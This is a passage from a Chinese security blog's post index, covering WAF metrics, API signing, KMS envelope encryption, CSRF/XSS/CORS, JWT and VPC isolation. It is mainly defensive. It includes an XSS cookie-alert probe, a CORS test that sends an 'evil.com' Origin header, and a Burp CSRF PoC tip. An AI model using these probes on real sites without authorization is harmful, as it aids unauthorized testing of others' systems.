title=\"WAF指标\"></a>WAF指标</h3><p>误报率=误报数量/检测到的攻击数量<br>漏报率=（1-检出率）=漏报数量/攻击总量<br>MTTD=安全威胁平均检测时间<br>MTTR=安全威胁平均响应时间<br>WAF覆盖率=已接入WAF域名数量/需接入WAF域名数量<br>拦截开启率=已开启拦截模式的域名数量/已接入WAF域名数量<a id=\"more\"></a></p>\n<p><img src=\"/images/waf_fenlei.PNG\" alt=\"攻击类型\"><br><img src=\"/images/waf_total.PNG\" alt=\"攻击数量\"></p>\n<h3 id=\"测试说明\"><a href=\"#测试说明\" class=\"headerlink\" title=\"测试说明\"></a>测试说明</h3><p>黑样本220w，白样本30w，漏报率=1-拦截量/攻击总量（黑样本）<br>自研WAF——黑样本：漏报率≈25%，白样本：误报率≈0%<br>阿里云 &ensp;&nbsp;——黑样本：漏报率≈5%，&ensp;白样本：误报率≈0%<br>腾讯云 &ensp;&nbsp;——黑样本：漏报率≈29%，白样本：误报率≈0%</p>\n<p>实际生产，WAF每天拦截上千万次请求</p>\n<h3 id=\"WAF接入自动化\"><a href=\"#WAF接入自动化\" class=\"headerlink\" title=\"WAF接入自动化\"></a>WAF接入自动化</h3><p>新上线业务自动化接入WAF<br>在公司的统一接入层网关上做WAF，统一入口，网关转发给WAF在公司内网，延迟很低。(转发和检测可在1ms内完成。)<br>WAF是so文件部署在NG中</p>\n<h3 id=\"WAF规则引擎\"><a href=\"#WAF规则引擎\" class=\"headerlink\" title=\"WAF规则引擎\"></a>WAF规则引擎</h3><p>优先经过正则引擎，再经过大数据深度学习引擎，互为补充</p>\n<h3 id=\"联动\"><a href=\"#联动\" class=\"headerlink\" title=\"联动\"></a>联动</h3><p>xSRC、蓝军、入侵检测、漏洞扫描系统等，提供WAF的策略优化更新</p>\n<h3 id=\"Idea\"><a href=\"#Idea\" class=\"headerlink\" title=\"Idea\"></a>Idea</h3><p>WAF也提供开放平台，支持各业务团队来制定阻断策略，展示自己名下的WAF攻击日志</p>\n<p><img src=\"/images/waf.PNG\" alt=\"\" title=\"传统WAF架构\"></p>\n","categories":["WAF指标"],"tags":["WAF指标"]},{"title":"架构评审——安全要求","url":"/2020/10/19/jiagou/","content":"<h3 id=\"xxx系统架构设计\"><a href=\"#xxx系统架构设计\" class=\"headerlink\" title=\"xxx系统架构设计\"></a>xxx系统架构设计</h3><p>描述系统安全性设计与实现方案。系统安全性包括网络安全、系统安全、数据安全、交易安全等。例如：IP地址鉴权；各类数据加密机制；各类通讯加密机制；身份识别及认证等</p>\n","categories":["架构安全"],"tags":["安全架构"]},{"title":"API&签名","url":"/2020/10/17/api/","content":"<h3 id=\"两种签名\"><a href=\"#两种签名\" class=\"headerlink\" title=\"两种签名\"></a>两种签名</h3><p>发起方A—–签名—–&gt;接收方B<br>① 双方共享/知道某个secret，用同一个算法来签名/验签（如对称密钥HMAC算法）<br>② A用私钥签名，B用A的公钥验签</p>\n<h3 id=\"接口安全\"><a href=\"#接口安全\" class=\"headerlink\" title=\"接口安全\"></a>接口安全</h3><p>如果是前后端分离的系统，那么接口一定会暴露在js中，多找找可能有未授权的惊喜</p>\n<h3 id=\"接口安全-1\"><a href=\"#接口安全-1\" class=\"headerlink\" title=\"接口安全\"></a>接口安全</h3><p>如果是前后端分离的系统，那么接口一定会暴露在js中，多找找可能有未授权的惊喜</p>\n<h3 id=\"Q-amp-A\"><a href=\"#Q-amp-A\" class=\"headerlink\" title=\"Q&amp;A\"></a>Q&amp;A</h3><hr>\n<p>Q：签名是在哪做？是为了啥？证明谁的身份？场景是什么？<br>A：数据发起的一方，证明是我发的，签名主要证明数据没有被篡改，签名发起方和接收方算法保持一致</p>\n<hr>\n<p>Q：客户端请求服务器端，API请求怎么签名？<br>1、客户端内置appkey和secret，sign字段=MD5(key1value1key2value2…secret)进行MD5计算发给服务端<br>2、建议把appsecret放到NDK中编译成so文件，app启动后去读取<br>3、或者第一次APP安装启动时，下发secret<a id=\"more\"></a></p>\n<hr>\n<p>Q：浏览器请求服务器端，API请求怎么签名？<br>A：js中保存appsecret有较高风险，建议采用随机分配令牌的方式，为每个访问端分配一个token保存在cookie中，通过cookie请求头(cookie:h5_token=xxx;sessionid=xxx)传回服务端，sign=MD5(key1value1key2value2…token)<br>A：- <a href=\"https://mp.weixin.qq.com/s?__biz=MzIwNjUxMTQyMA%3D%3D&chksm=9721cf1ca056460a644f61bb84c255eb7620ac1905e8652ffb1a869c5432aac77a81400f90bd&idx=1&lang=zh_CN&mid=2247484239&scene=21&sn=1530557bc16ad40616d6614017a872d7&token=205497283#wechat_redirect\" title=\"小歪丶 Python爬虫与算法进阶\">淘宝sign签名算法</a></p>\n<hr>\n<p>Q：APP签名机制？<br>A：开发者把自己的公钥上传到苹果，苹果给每个开发者颁发证书，在IOS上安装APP时，苹果会校验证书签名</p>\n<hr>\n<p><a href=\"https://opendocs.alipay.com/open/common/105912\" title=\"支付宝应用安全开发指南\">第三方应用安全开发指南</a></p>\n<object data=\"/pdf/开放平台第三方应用安全开发指南.pdf\" type=\"application/pdf\" width=\"100%\" height=\"677px\">\n","categories":["签名"],"tags":["接口"]},{"title":"KMS密钥管理","url":"/2020/10/10/kms/","content":"<h3 id=\"KMS\"><a href=\"#KMS\" class=\"headerlink\" title=\"KMS\"></a>KMS</h3><p>目的：<br>禁止业务调用方，本地私自<strong>明文存储</strong>敏感信息（如密钥）。并非应用执行加密算法时对密钥的加密（在内存中是明文密钥）</p>\n<p><img src=\"/images/KMS.png\" alt=\"KMS架构\"></p>\n<a id=\"more\"></a>\n<p>密钥分级</p>\n<ul>\n<li>数据密钥DEK：三级密钥，用来加密明文数据的密钥</li>\n<li>主密钥CMK：二级密钥，用来加密<strong>数据密钥</strong>的密钥</li>\n<li>根密钥RootKey：一级密钥，用来加密<strong>主密钥</strong>的密钥</li>\n</ul>\n<h4 id=\"术语\"><a href=\"#术语\" class=\"headerlink\" title=\"术语\"></a>术语</h4><p>HSM：加密机，一般是芯片硬件，提供根密钥生成和保管<br>KMS：后台程序，负责从硬件安全模块HSM获取/保存根密钥（内存），派生算法生成主密钥/数据密钥，主密钥加密持久化保存在数据库中（数据密钥可存储可不存储，阿里云是不存储的）<br>SDK：给业务系统客户端使用，集成KMS API组件，其中的加解密模块就是OpenSSL封装起来的库</p>\n<h4 id=\"用途\"><a href=\"#用途\" class=\"headerlink\" title=\"用途\"></a>用途</h4><p>主密钥CMK，租户永远不知道其256位值，只看到主密钥的UUID。当然可以创建多个CMK，一个CMK可以加密多个DEK。KMS的作用就是替各个业务系统加密DEK，安全的存储CMK。</p>\n<h4 id=\"场景1——直接加密\"><a href=\"#场景1——直接加密\" class=\"headerlink\" title=\"场景1——直接加密\"></a>场景1——直接加密</h4><ul>\n<li>对配置文件的加密</li>\n<li>对SSL私钥的加密</li>\n</ul>\n<p><strong>敏感信息直接加密</strong>是密钥管理服务（KMS）核心的能力，适用于保护小型敏感数据（小于4KB），如<big>密钥、证书、配置文件</big>等。</p>\n<p><img src=\"/images/KMS_cmk.jpg\" alt=\"直接加密\"><br>采用对称加密的方式，调用方通常是企业运维系统，将敏感数据<strong>明文</strong>POST给KMS进行加密，返回密文存储。将密文部署在企业应用服务器上，应用使用时，调用KMS解密在内存中，明文没有落地。<br>主要防止某一个环节禁止存放明文数据，故采用调KMS进行加密。</p>\n<h4 id=\"场景2——信封加密\"><a href=\"#场景2——信封加密\" class=\"headerlink\" title=\"场景2——信封加密\"></a>场景2——信封加密</h4><ul>\n<li>对业务数据文件的加密</li>\n<li>对服务器上的磁盘数据加密</li>\n</ul>\n<p><img src=\"/images/KMS_encrypt.png\" alt=\"加密SDK使用场景\"></p>\n<p>业务系统A已集成KMS的SDK<br>i.通过KMS控制台，或者调用CreateKey接口，创建一个用户主密钥。<br>ii.调用GenerateDataKey接口创建一个数据密钥。KMS会返回一个明文的数据密钥和一个密文的数据密钥。<br>iii.使用明文的数据密钥加密文件，产生密文文件，然后销毁内存中的明文密钥。<br>iv.用户将密文数据密钥和密文文件一同存储到持久化存储设备或服务中。</p>\n<p>其实，业务系统A也可以自己生成数据密钥，不一定非得KMS帮你生成DEK，本地用DEK加密文件得到密文，然后调KMS执行主密钥加密，返回密文。这种用到了主密钥加密也可认为是信封加密。<br>综述，租户的主密钥保存在KMS数据库中，加密主密钥的根密钥保存在HSM硬件中。</p>\n<h4 id=\"场景3——密码托管系统\"><a href=\"#场景3——密码托管系统\" class=\"headerlink\" title=\"场景3——密码托管系统\"></a>场景3——密码托管系统</h4><p>场景1和2，KMS只是托管了加/解密的key，未托管业务的敏感数据凭证，如数据库凭据、API密钥、账号密码等。<br>在KMS系统之上封装一下，就是Vault，即凭据托管系统，实现密码托管及自动轮换。<br><img src=\"/images/KMS_%E6%89%98%E7%AE%A1%E5%AF%86%E7%A0%81.png\" alt=\"直接加密\"><br>注意：凭据的录入、凭据的定期轮换是凭据的产生者——运维平台负责的。密码托管系统只是代为保管凭证，<code>不生产凭据，只是凭据的搬运工</code></p>\n<h4 id=\"最佳实践——相册云端加密存储\"><a href=\"#最佳实践——相册云端加密存储\" class=\"headerlink\" title=\"最佳实践——相册云端加密存储\"></a>最佳实践——相册云端加密存储</h4><p>上述场景，KMS和业务系统之间，终究（始终）会传递敏感信息/密钥，试想如果KMS在云端厂商上，如何保障安全？<br>-<a href=\"https://bt7k.com/?p=456\" title=\"KMS自己的AK/SK如果保障安全\">KMS AK在阿里云上的管理方案</a></p>\n<p>核心目标：终端用户的数据，只能用户自己看到（手机端、浏览器访问云相册均可），噱头就是云服务提供商也看不到明文，因为是加密存储</p>\n<p>蓝钥匙，本地随机key用来加密图片等数据<br>红钥匙，主密钥CMK公钥，加密蓝钥匙<br>金钥匙，根密钥，负责生成CMK的公钥和私钥<br>绿钥匙，手机设备公私钥对，公钥上传到CMK，便于一用户多终端认证+下发红钥匙。设备出厂时，预置了设备证书与公私钥对（存储在TEE），设备的公私钥对每台都不同，用于标识设备的唯一合法身份。<br><img src=\"/images/KMS_huawei.png\" alt=\"云空间四重加密技术\"><br>KMS云端存储：红钥匙<br>云空间存储：加密后的相册数据、加密后的蓝钥匙<br>手机端存储：红钥匙CMK公钥、绿钥匙设备公私钥，都存在TEE中</p>\n<p>效果：认证后，自己的图片只有自己能看到，在手机端、在浏览器中访问云空间等方式，都可以看到明文图片，只不过存储时是加密的<br>总结：华为采用的是KMS的非对称CMK</p>\n<h4 id=\"KMS问答\"><a href=\"#KMS问答\" class=\"headerlink\" title=\"KMS问答\"></a>KMS问答</h4><hr>\n<p>Q：根密钥、主密钥、数据密钥都在哪存储？<br>A：根密钥在HSM的硬件芯片中，主密钥在KMS的数据库中加密存储，数据密钥在应用系统本地加密存储。</p>\n<hr>\n<p>Q：数据密钥的使用和存储？<br>A：KMS不会存储你的数据密钥，当然也不会存储根密钥，使用根密钥时是在硬件内存中的，不会落地。<br>A：业务系统加载使用数据密钥时，是在内存中的，明文，不会落地。（当然你非要明文落地，也没人管你）<br>A：凡是落地的密钥，都要加密，禁止明文存储。</p>\n<hr>\n<p>Q：主密钥会在客户端内存中么？<br>A：主密钥永远不会离开KMS+HSM，故不会在业务系统的内存中。即业务系统永远不知道CMK，只知道UUID。<br>A：如果业务系统自己生成一个密钥，上传到了KMS中。可以指定这个密钥是CMK，只是委托KMS用根密钥加下密。当然一般场景下，这个密钥是DEK，只是委托KMS用主密钥加下密。</p>\n<hr>\n<p>Q：调用方永远不知道明文数据块？<br>A：KMS只是负责帮你加密或托管密钥key，明文数据毕竟是你提供的，只是避免明文存储，间接的人为看到。</p>\n<hr>\n<p>Q：数据密钥DEK怎么生成的，DEK存在KMS中？<br>A：第一种通过KMS的主密钥CMK生成，但KMS不会存储、管理你的DEK<br>A：第二种应用系统本地生成，然后发给KMS让它加密。Google推荐的最佳实践</p>\n<hr>\n<p>Q：主密钥直接加密和信封加密的区别？<br>A：主密钥直接加密，待加密可能是key也可能是敏感信息，如果是敏感信息，KMS和业务系统之间传输过程中的风险问题<br>A：信封加密，KMS和业务系统之间，传输的只能是key</p>\n<hr>\n<p>Q：主密钥直接加密业务方提供的数据，有啥缺点？</p>\n<ul>\n<li>主密钥加密的东西，支持最大4KB的数据</li>\n<li>信封加密降低了网络负载，可提供巨大的性能优势</li>\n<li>将需要加密的数据通过网络传输到KMS后端，传输过程中的安全风险问题（相比只传输密钥key）</li>\n</ul>\n<hr>\n<p>Q：KMS中会保存业务数据么？比如db密码、appkey等<br>A：KMS的作用是维护DEK&amp;CMK密钥的安全，而不是口令的托管。<br>A：Vault可以托管db密码、appkey，即密码托管系统，会用到KMS的加密机功能</p>\n","categories":["KMS"],"tags":["密钥管理"]},{"title":"CSRF和XSS","url":"/2020/09/07/csrf/","content":"<p>-<a href=\"https://tech.meituan.com/2018/10/11/fe-security-csrf.html\">前端安全系列（二）：如何防止CSRF攻击？</a></p>\n<h3 id=\"CSRF\"><a href=\"#CSRF\" class=\"headerlink\" title=\"CSRF\"></a>CSRF</h3><p>跨站请求伪造</p>\n<ul>\n<li><h4 id=\"场景\"><a href=\"#场景\" class=\"headerlink\" title=\"场景\"></a>场景</h4>用户访问有CSRF漏洞的网站A，然后又访问了网站B（恶意网站），网站B劫持网站A的Cookie发送请求，在用户无感知的情况下以他的名义发送请求给网站A。<a id=\"more\"></a></li>\n<li><h4 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h4>攻击者看不到Cookie内容，由于同源策略限制，也拿不到Cookie，仅仅是借助用户的Cookie发送请求给CSRF漏洞网站，也获取不到Response的内容。换句话说，GET基本上没有CSRF漏洞（因为其他操作都用POST），所以GET请求基本上不需要CSRF防护。</li>\n<li><h4 id=\"验证\"><a href=\"#验证\" class=\"headerlink\" title=\"验证\"></a>验证</h4>抓包后，去掉请求头的Referer字段重新提交，若提交还有效，证明存在CSRF漏洞</li>\n</ul>\n<ul>\n<li><h4 id=\"预防\"><a href=\"#预防\" class=\"headerlink\" title=\"预防\"></a>预防</h4>1、增加验证码<br>2、检查Referer<br>3、添加CSRFtoken<br>（CSRF攻击之所以能成功，是因为攻击者可完全伪造用户的请求，该请求中的验证信息都是存在Cookie中，因此可直接利用用户自己的Cookie来发请求。要抵御CSRF，关键在于在请求中放入攻击者不能伪造的信息，并且该信息不存在Cookie中。如GET请求csrftoken附在URL之后，POST请求在form表单最后加上<code>&lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;tokenvalue&quot;/&gt;</code>）</li>\n<li><h5 id=\"TIPs\"><a href=\"#TIPs\" class=\"headerlink\" title=\"TIPs\"></a>TIPs</h5>在burp中，右键Engagement tools –&gt; Generate CSRF Poc，产生一个恶意的网站B，修改value的参数值，来测试value修改后是否生效。</li>\n</ul>\n<h3 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h3><p>跨站脚本攻击</p>\n<ul>\n<li><h4 id=\"场景-1\"><a href=\"#场景-1\" class=\"headerlink\" title=\"场景\"></a>场景</h4><p>获取用户在该网站的Cookie</p>\n</li>\n<li><h4 id=\"验证-1\"><a href=\"#验证-1\" class=\"headerlink\" title=\"验证\"></a>验证</h4><p>插入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>\n</li>\n<li><h4 id=\"预防-1\"><a href=\"#预防-1\" class=\"headerlink\" title=\"预防\"></a>预防</h4><p>1、设置HttpOnly，禁止js读取Cookie。HttpOnly并非阻止XSS攻击，而是能阻止XSS攻击后的Cookie劫持攻击。<br>2、输入检查，过滤、转义<br>3、输出检查</p>\n</li>\n</ul>\n<h3 id=\"CORS漏洞\"><a href=\"#CORS漏洞\" class=\"headerlink\" title=\"CORS漏洞\"></a>CORS漏洞</h3><p>跨域资源共享漏洞</p>\n<ul>\n<li><h4 id=\"场景-2\"><a href=\"#场景-2\" class=\"headerlink\" title=\"场景\"></a>场景</h4><p>获取用户的Response等敏感信息，如GET请求</p>\n</li>\n<li><h4 id=\"验证-2\"><a href=\"#验证-2\" class=\"headerlink\" title=\"验证\"></a>验证</h4><p>添加/修改请求头中Origin: <code>http://evil.com</code>字段，若返回头是Access-Control-Allow-Origin: <code>http://evil.com</code>，证明存在CORS漏洞</p>\n</li>\n<li><h4 id=\"预防-2\"><a href=\"#预防-2\" class=\"headerlink\" title=\"预防\"></a>预防</h4><p>1、如无必要，不要开启CORS<br>2、严格校验Access-Control-Allow-Origin白名单，禁止*<br>3、尽量避免使用Access-Control-Allow-Credentials</p>\n</li>\n</ul>\n","categories":["CSRF"],"tags":["CORS","XSS","CSRF"]},{"title":"session和cookie","url":"/2020/08/21/cookie/","content":"<h3 id=\"session和cookie\"><a href=\"#session和cookie\" class=\"headerlink\" title=\"session和cookie\"></a>session和cookie</h3><p><img src=\"/images/session.png\" alt=\"session-cookie\"><br>1、session-cookie是一对，session保存在服务端memcache/redis，cookie保存客户端硬盘</p>\n<p>2、客户端只需要保存session_id，加密存储在cookie硬盘中，发送给服务端。<a id=\"more\"></a></p>\n<p>3、浏览器把cookie以KV形式存储到硬盘中。session等登录用户信息存储在服务端</p>\n<p>4、API模式是不支持cookie的</p>\n<p>5、session_id欺骗<code>Cookie: JSESSIONID=2CC28F5D92F7CF0DFB1B21CBD3F161B9</code></p>\n<h3 id=\"token\"><a href=\"#token\" class=\"headerlink\" title=\"token\"></a>token</h3><p>1、token是为了解决session存储问题的</p>\n<p>2、token是在服务端用私钥签名生成的，发送给客户端后，客户端保存在cookie/localStorage（本地存储），在服务端验证token，可存储也可不存（session必须存储）。</p>\n<p>3、移动端对cookie的支持不是很好，而session需要基于cookie实现，所以移动端常用的是token</p>\n","categories":["session"],"tags":["session"]},{"title":"后台安全管理规范","url":"/2020/07/09/houtai/","content":"<p>1.管理后台必须与业务系统分离，单独部署。<br>2.通过政策或规则加强密码复杂度（比如：要求使用字母、数字和特殊符号）和密码长度（常用的是至少8个字符长度）。<br>3.身份验证的失败提示信息应当避免过于明确。比如：可以使用“用户名或密码错误”，而不要使用“用户名错误”或者“密码错误”。<br>4.管理后台需要部署在内网并接入AD，禁止外网访问。<br>5.如有业务需要部署外网，请使用双因素认证登录，比如“账号+密码+短信验证码“或者“账号+密码+动态令牌“或者“账号+密码+邮箱验证码“。<br>6.管理后台需要保留日志记录，日志支持记录所有的操作以及特定安全事件的成功或失败操作（比如所有的身份验证尝试，失败的控制访问等）。<br>7.采用黑白名单机制，如IP、UA、referer等。</p>\n","categories":["后台"],"tags":["后台"]},{"title":"安全密钥管理","url":"/2020/06/12/key/","content":"<h3 id=\"API接口签名验证-开放平台鉴权\"><a href=\"#API接口签名验证-开放平台鉴权\" class=\"headerlink\" title=\"API接口签名验证/开放平台鉴权\"></a>API接口签名验证/开放平台鉴权</h3><p>app_key：同账号<br>app_secret：同密码, 表示你真的拥有这个权限<br>用来申请一个token，access token过期失效<a id=\"more\"></a></p>\n<h4 id=\"调用第三方的key-secret，保存在客户端APP还是服务器端？\"><a href=\"#调用第三方的key-secret，保存在客户端APP还是服务器端？\" class=\"headerlink\" title=\"调用第三方的key/secret，保存在客户端APP还是服务器端？\"></a>调用第三方的key/secret，保存在客户端APP还是服务器端？</h4><p>推荐保存在服务器端，客户端储存密钥一定是不安全的</p>\n<figure class=\"highlight clean\"><table><tr><td class=\"code\"><pre><span class=\"line\">#### 调第三方接口，是客户端调还是服务端调？</span><br><span class=\"line\">理想情况：</span><br><span class=\"line\"><span class=\"number\">1</span>、客户端用App_id去调WX、weibo、AliPay，拿到<span class=\"keyword\">code</span></span><br><span class=\"line\"><span class=\"number\">2</span>、服务端用<span class=\"keyword\">code</span>也去调第三方接口，获取access_token，返回给客户端</span><br><span class=\"line\">#### 存在服务端，调用麻烦，传输secret？</span><br><span class=\"line\">是的，发送key/secret给客户端，同HTTPS握手阶段一样，产生一个随机会话密钥，加密发给APP，APP解密后再去调第三方接口</span><br><span class=\"line\"></span><br><span class=\"line\">TIPs：第三方secret不是在使用过程中直接传送，而是用来运算的（签名校验）。建议服务端去运算返回APP，让APP直接使用</span><br></pre></td></tr></table></figure>\n\n<p>按第三方接口的认证方式可以分成两类：<br>1.直接传递 key：这种情况下只能用服务器端中转客户端到第三方的请求；<br>2.传递由 key 计算得到的某种短期 /临时 token：客户端请求服务器返回一个可用的 token，再用此 token 直接请求第三方。<br>1 的优势是服务器端掌控一切，想干嘛干嘛（比如权限控制、统计），而且方便更新，劣势是增加服务器负载；<br>2 的优势是服务器负载小，请求响应快。很适合上传文件这种流量大的请求。或者直接传递key</p>\n<h4 id=\"结论\"><a href=\"#结论\" class=\"headerlink\" title=\"结论\"></a>结论</h4><p>1、存放在APP端不可取，密钥更新必须强制更新APP<br>2、折中方案：使用会话密钥，避免直接固化secret在APP，也减少全部在后端运算负担。</p>\n<h3 id=\"白盒密钥\"><a href=\"#白盒密钥\" class=\"headerlink\" title=\"白盒密钥\"></a>白盒密钥</h3><p>对称密钥的key在内存运行时依然是明文的，白盒密钥实现在内存中是密文的</p>\n<h3 id=\"AES加解密\"><a href=\"#AES加解密\" class=\"headerlink\" title=\"AES加解密\"></a>AES加解密</h3><p>明文10M文件，AES加密后也是10M密文，密钥是固定256位，密文存储用的是BASE64（你看到的密文是BASE64处理过的，即使解密也是乱码）</p>\n<h3 id=\"Q-amp-A\"><a href=\"#Q-amp-A\" class=\"headerlink\" title=\"Q&amp;A\"></a>Q&amp;A</h3><hr>\n<p>Q：前端加密敏感数据，密钥存放在哪里？不让硬编码在JS中，那放哪？<br>A：前端加密password等敏感字段，是用后端的公钥加密的，公钥可以硬编码在js中。<br>A：前端随机产生一个key，用来AES加密数据，然后用后端公钥加密key，一起传给后端。<!--more--></p>\n<hr>\n<p>Q：密钥硬编码在代码中，有安全风险，那密钥存在哪里？后端的代码可以硬编码么？<br>A：后端硬编码不在公网上传输，其实也是安全的，但不推荐，不合规。</p>\n<hr>\n<p>Q：已经使用了HTTPS，前端加密是否有意义？<br>A：HTTPS并不是端到端（End to End），而往往中间夹杂着代理，有客户端代理也有服务端代理，他们自然就可以看到用户https明文流量，其中也包含用户的明文密码。一旦前端加密了用户密码，即使有代理的存在，依然无法获取明文密码。</p>\n<hr>\n<p>Q：前端应用中的API密钥如何保存？<br>A：应该使用后端获取API的结果，返回给前端。</p>\n","categories":["密钥"],"tags":["APIkey"]},{"title":"SDK与API区别","url":"/2020/06/06/sdk/","content":"<h3 id=\"SDK是二进制包，还是源代码\"><a href=\"#SDK是二进制包，还是源代码\" class=\"headerlink\" title=\"SDK是二进制包，还是源代码\"></a>SDK是二进制包，还是源代码</h3><p>SDK不是源代码，是工具包，编译后的jar、dll、so组件供开发者调用。<br>是完全封装好的，提供的是一个二进制的包</p>\n<h3 id=\"SDK需要升级\"><a href=\"#SDK需要升级\" class=\"headerlink\" title=\"SDK需要升级\"></a>SDK需要升级</h3><h3 id=\"SDK和开发语言相关\"><a href=\"#SDK和开发语言相关\" class=\"headerlink\" title=\"SDK和开发语言相关\"></a>SDK和开发语言相关</h3><h3 id=\"SDK与API的区别\"><a href=\"#SDK与API的区别\" class=\"headerlink\" title=\"SDK与API的区别\"></a>SDK与API的区别</h3><p>API文档一般是多个接口，需要消费者实现逻辑函数，比如先调用登录API，得到某个信息后，再调用另一个API，拿到另一个信息后，再调用下一个API，最后完成操作。<br>相比之下，如果用SDK的话，可能只需要写一句话就好了，因为别人已经封装好了。</p>\n<h3 id=\"SDK提供方\"><a href=\"#SDK提供方\" class=\"headerlink\" title=\"SDK提供方\"></a>SDK提供方</h3><p>提供API比提供SDK简单很多，因为SDK提供方要提供不同平台环境的，比如windows、IOS、Android的包。</p>\n","categories":["SDK"],"tags":["SDK"]},{"title":"JWT/Oauth","url":"/2020/05/30/jwt/","content":"<h3 id=\"App-key-amp-App-secret\"><a href=\"#App-key-amp-App-secret\" class=\"headerlink\" title=\"App_key&amp;App_secret\"></a>App_key&amp;App_secret</h3><p><img src=\"/images/AppSecret%E5%AE%89%E5%85%A8%E5%9C%BA%E6%99%AF.jpg\" alt=\"AppSecret安全场景\"></p>\n<a id=\"more\"></a>\n<h3 id=\"Oauth2-0示意图\"><a href=\"#Oauth2-0示意图\" class=\"headerlink\" title=\"Oauth2.0示意图\"></a>Oauth2.0示意图</h3><p>针对上图，进一步细化第2、3、4步。<br><img src=\"/images/Oauth2.0%E7%A4%BA%E6%84%8F%E5%9B%BE.jpg\" alt=\"Oauth2.0示意图\"></p>\n<h3 id=\"Oatuth2-0解决了你调用第三方，至于你的后端和你的APP（前端）如何信任，是你自己解决\"><a href=\"#Oatuth2-0解决了你调用第三方，至于你的后端和你的APP（前端）如何信任，是你自己解决\" class=\"headerlink\" title=\"Oatuth2.0解决了你调用第三方，至于你的后端和你的APP（前端）如何信任，是你自己解决\"></a>Oatuth2.0解决了你调用第三方，至于你的后端和你的APP（前端）如何信任，是你自己解决</h3><p>客户端调用服务器端的校验，如Token或JWT，防止其他APP调用你的后端<br>服务器对接服务器，推荐AppID&amp;AppSecret</p>\n<h3 id=\"传统的基于Token校验\"><a href=\"#传统的基于Token校验\" class=\"headerlink\" title=\"传统的基于Token校验\"></a>传统的基于Token校验</h3><p>APP项目或前后端分离的项目，大多是基于Token的验证。</p>\n<figure class=\"highlight gauss\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>、通过账号&amp;密码登陆成功，服务器生成一个<span class=\"built_in\">token</span></span><br><span class=\"line\"><span class=\"number\">2</span>、服务端把该<span class=\"built_in\">token</span>和userid保存到数据库（或Redis）中，然后把<span class=\"built_in\">token</span>值返回给前端</span><br><span class=\"line\"><span class=\"number\">3</span>、客户端每次请求都带上该<span class=\"built_in\">token</span>，服务端根据该<span class=\"built_in\">token</span>查询是否合法和过期，然后去数据库中查出来userid进行使用</span><br></pre></td></tr></table></figure>\n\n<p>缺点：<br>1、验证信息存在数据库中，每次都要根据token查询userid，增加数据库开销<br>2、token一旦被泄露，很容易跨站请求伪造</p>\n<h3 id=\"JWT\"><a href=\"#JWT\" class=\"headerlink\" title=\"JWT\"></a>JWT</h3><p>JWT是token的升级，利用userId生成Token，该token可直接被用于认证。适用于分布式站点的单点登录场景</p>\n<p>JWT示例：</p>\n<figure class=\"highlight lasso\"><table><tr><td class=\"code\"><pre><span class=\"line\">eyJ0eXAxIjoiMTIzNCIsImFsZzIiOiJhZG1pbiIsInR5cCI6IkpXVCIsImFsZyI6IkhTMjU2In0.eyJVc2VySWQiOjEyMywiVXNlck5hbWUiOiJhZG1pbiIsImV4cCI6MTU1MjI4Njc0Ni44Nzc0MDE4fQ.pEgdmFAy73walFonEm2zbxg46Oth3dlT02HR9iVzXa8</span><br><span class=\"line\"></span><br><span class=\"line\">your<span class=\"number\">-256</span><span class=\"params\">-bit</span><span class=\"params\">-secret</span>：GQDstcKsx0NHjPOuXOYg5MbeJ1XT0uFiwDVvVBrk</span><br><span class=\"line\"></span><br><span class=\"line\">JWT一般放在HTTP <span class=\"keyword\">header</span>头</span><br><span class=\"line\">Authorization: Bearer eyJ0eXAxIjoiM*<span class=\"params\">...</span>&lt;snip&gt;<span class=\"params\">...</span>*T02HR9iVzXa8</span><br></pre></td></tr></table></figure>\n<p>说明：签发生成jwt需要密钥your-256-bit-secret，这个存储在服务器端，不要泄露，在不知道密钥的情况下，是不能进行解密的，secret就是用来进行jwt的签发和jwt的验证，当然这些都是在服务器端做的事情。所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端可以伪造他人id越权攻击了。</p>\n<p><img src=\"/images/JWT.jpg\" alt=\"JWT调用\"><br>JWT是无状态的，不需要服务器端保存会话信息，直接存储在客户端上localstorage</p>\n<p>JWT不是用来替代session的，可使用JWT存类似session id之类的信息。正常的解决方案是JWT中存一些用户ID之类的信息，其他敏感信息还是用缓存服务器较好</p>\n","categories":["JWT","Oauth"],"tags":["JWT","Oauth"]},{"title":"VPC网络隔离","url":"/2020/05/17/vpc/","content":"<h3 id=\"vpc和网络隔离区域\"><a href=\"#vpc和网络隔离区域\" class=\"headerlink\" title=\"vpc和网络隔离区域\"></a>vpc和网络隔离区域</h3><p>推荐一个vpc划分一个网络域，如DMZ是一个VPC，PTR是一个VPC</p>\n<h3 id=\"vpc和安全组的区别\"><a href=\"#vpc和安全组的区别\" class=\"headerlink\" title=\"vpc和安全组的区别\"></a>vpc和安全组的区别</h3><p>一个vpc内部，划分不同的网络区域，比如DMZ、PTR、SF等，不同网络区域由安全组来控制<br>vpc之间天然隔离，打通后必须配置安全组，才能实现vpc之间的通信<a id=\"more\"></a></p>\n<h3 id=\"云防火墙与安全组的区别\"><a href=\"#云防火墙与安全组的区别\" class=\"headerlink\" title=\"云防火墙与安全组的区别\"></a>云防火墙与安全组的区别</h3><p>云防火墙主要对南北流量过滤，针对vpc控制<br>安全组主要对东西向控制，同一个vpc中的通信只能依靠安全组</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">默认规则如下：</span><br><span class=\"line\">•一个网络域内的云资源可以互通，无需配置安全组。</span><br><span class=\"line\">•一个VPC内不同的网络域之间的云资源入方向放行，出方向阻断，需要配置出方向的安全组才可互通</span><br><span class=\"line\">•不同VPC之间、VPC和互联网之间、VPC和租户本地数据中心之间出入方向都阻断，需要配置出、入双方向的安全组才可互通。</span><br></pre></td></tr></table></figure>\n\n<p>一个容器集群只部署在一个网络隔离区内，不跨区部署。<br>比如区分内外网应用，不要公用一个k8s集群。一套容器云管平台管理多套k8s集群</p>\n<h3 id=\"两种网络插件对比\"><a href=\"#两种网络插件对比\" class=\"headerlink\" 